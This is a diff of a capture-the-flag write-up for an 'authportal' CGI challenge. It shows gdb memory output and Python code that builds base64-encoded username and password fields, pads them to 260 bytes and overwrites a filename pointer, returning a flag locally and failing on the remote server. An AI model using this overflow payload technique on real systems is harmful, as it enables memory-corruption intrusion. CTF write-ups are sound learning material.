@@ -410,21 +410,26 @@ gef➤  x/29x $rsi
 0x7ffc8783929c: 0x89    0xd8    0xba    0x19    0x00
 ```
 
+Okay. This is the null terminated (binary) data containing a colon (0x3a @ 0x7ffc87839294). Let's use the bytes up to colon as username, base64 encode that. Use bytes following colon up to null termination as password, base64 encode that. Fill up password with null bytes so that username + colon + password are 260 bytes long and then add the little endian address to overwrite the filename string pointer with the one for /lib64/ld-linux-x86-64.so.2!
 
-
-we have 16 chars for username, colon, and then 11 chars pass before first \0
-fill up pass with \0 and then overwrite filename with offset $rax  : 0x00000000004002a8 → "/lib64/ld-linux-x86-64.so.2"
-
->>> import requests
->>> from base64 import b64encode
->>> import json
->>> data['user'] = b64encode(b'\x48\x29\xf8\x41\x0f\xb6\x3c\x01\x48\x89\xc8\x48\x89\xd1\x41\x88').decode('utf-8')
->>> data['pass'] = b64encode(b'\x48\x83\xf8\x09\x77\xd1\x4c\x89\xd8\xba\x19' + b'\x00'*232 + b'\xa8\x02\x40').decode('utf-8')
+Back to python console
+```python
+>>> username = b'\x48\x29\xf8\x41\x0f\xb6\x3c\x01\x48\x89\xc8\x48\x89\xd1\x41\x88'
+>>> password = b'\x48\x83\xf8\x09\x77\xd1\x4c\x89\xd8\xba\x19'
+>>> data['user'] = b64encode(username).decode('utf-8')
+>>> data['pass'] = b64encode(password + b'\x00' * (260 - (len(username) + 1 + len(password))) + b'\xa8\x02\x40\x00').decode('utf-8')
 >>> requests.post('http://127.0.0.1:8000/cgi-bin/portal.cgi', data=json.dumps(data)).text
 '{"status": "success", "flag": "CS{foobar}"}'
-
+```
+That worked like a charm on the local vulnerable webserver. Awesomeness. The flag is so near. No?
+```
 >>> requests.post('https://authportal.challenges.adversary.zone:8880/cgi-bin/portal.cgi', data=json.dumps(data)).text
 '{"status": "err"}'
+```
+This is a good time to step back, take a break. Do some physical workout and backtrack... ;-)
+
+### Attempt 2 - 
+
 
 exploit works locally, but seems to fail on remote server
 -> could be because the /lib64/ link is a soft link and might be a different version on server?
